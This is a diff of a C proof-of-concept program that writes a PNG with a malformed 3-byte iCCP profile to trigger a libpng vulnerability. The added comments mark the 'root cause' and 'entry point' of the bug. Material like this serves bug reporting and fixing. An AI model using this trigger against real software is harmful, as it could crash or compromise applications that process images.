@@ -21,42 +21,54 @@ int main() {
     }
 
     if (setjmp(png_jmpbuf(png_ptr))) {
-        printf("libpng triggered an error (likely due to bad profile)\n");
+        fprintf(stderr, "libpng triggered an error (likely due to bad profile)\n");
         png_destroy_write_struct(&png_ptr, &info_ptr);
         fclose(fp);
         return 1;
     }
 
     png_init_io(png_ptr, fp);
-
     png_set_IHDR(png_ptr, info_ptr,
-                 1, 1,                    // width, height
-                 8,                      // bit_depth
-                 PNG_COLOR_TYPE_RGB,     // color_type
-                 PNG_INTERLACE_NONE,
-                 PNG_COMPRESSION_TYPE_BASE,
-                 PNG_FILTER_TYPE_BASE);
+                 1, 1, 8, PNG_COLOR_TYPE_RGB,
+                 PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_BASE, PNG_FILTER_TYPE_BASE);
 
-    // ICC profile (malformed): length < 4 bytes
-    char profile_name[] = "sRGB";
+    /**
+     * Malformed iCC profile (3 bytes instead of >= 4)
+     */
+    const char profile_name[] = "sRGB";
+    const png_charp profile_data = (png_charp)"ABC";
+    png_uint_32 profile_len = 3;
     int compression_type = 0;
 
-    // Invalid profile buffer of length 3 (should be ≥ 4)
-    png_bytep profile_data = (png_bytep)"ABC";
-    png_uint_32 profile_len = 3;
-
+    /**
+     * The root cause of the vulnerability starts here,
+     * when we set the malicious profile (iCC profile less than 4 bytes)
+     */
     png_set_iCCP(png_ptr, info_ptr,
                  profile_name, compression_type,
                  profile_data, profile_len);
 
+    /**
+     * The entry point to trigger the vulnerability is here,
+     * when we write the informations of the png file.
+     */
     png_write_info(png_ptr, info_ptr);
+    /**
+     * which calls:
+     * png_write_info_before_PLTE(png_ptr, info_ptr);
+     * that then calls:
+     * png_write_iCCP(png_ptr, info_ptr->iccp_name, info_ptr->iccp_profile);
+     */
+    
 
-    // Write dummy image row
+    /**
+     * The rest is what one would typically do to write a png image.
+     */
     png_bytep row = (png_bytep)malloc(3);
     memset(row, 255, 3);
     png_write_row(png_ptr, row);
-
     png_write_end(png_ptr, NULL);
+
     free(row);
     png_destroy_write_struct(&png_ptr, &info_ptr);
     fclose(fp);
